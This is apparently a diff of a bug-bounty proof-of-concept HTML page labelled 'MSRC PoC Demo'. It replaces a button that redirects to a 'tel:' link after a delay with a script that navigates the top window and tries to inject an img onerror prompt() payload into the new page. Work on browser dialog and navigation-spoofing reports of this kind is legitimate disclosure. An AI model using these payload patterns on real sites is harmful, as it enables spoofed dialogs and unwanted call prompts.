@@ -1,13 +1,39 @@
-<input
-  type="button"
-  value="CLICK ME"
-  onclick="
-    this.value = 'CALLING...';
-    var win = window.open('https://google.com', '_blank');
-    if (win) {
-      setTimeout(function () {
-        win.location.href = 'tel:Dhafy';
-      }, 10000);
-    }
-  "
-/>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>MSRC PoC Demo</title>
+</head>
+<body>
+<h1>MSRC PoC Demo - Safe</h1>
+<button id="trigger">Trigger Prompt</button>
+
+<script>
+function showPrompt() {
+
+    // ⏱️ DELAY sebelum redirect
+    setTimeout(function () {
+
+        // top-level navigation
+        const win = window.open('https://google.com:8080', '_top');
+
+        // ⏱️ delay kecil setelah navigasi
+        setTimeout(function () {
+            try {
+                win.document.body.innerHTML = `
+                    <h2>Demo Page</h2>
+                    <img src="" onerror="prompt('💡 Demo: bug.bounty.ids dialog persistence','')">
+                `;
+            } catch (e) {
+                console.log('Cross-origin DOM blocked (expected)');
+            }
+        }, 2000);
+
+    }, 2000); // ← DELAY 2 detik sebelum pindah
+}
+
+document.getElementById('trigger').addEventListener('click', function () {
+    showPrompt();
+});
+</script>
+</body>
+</html>
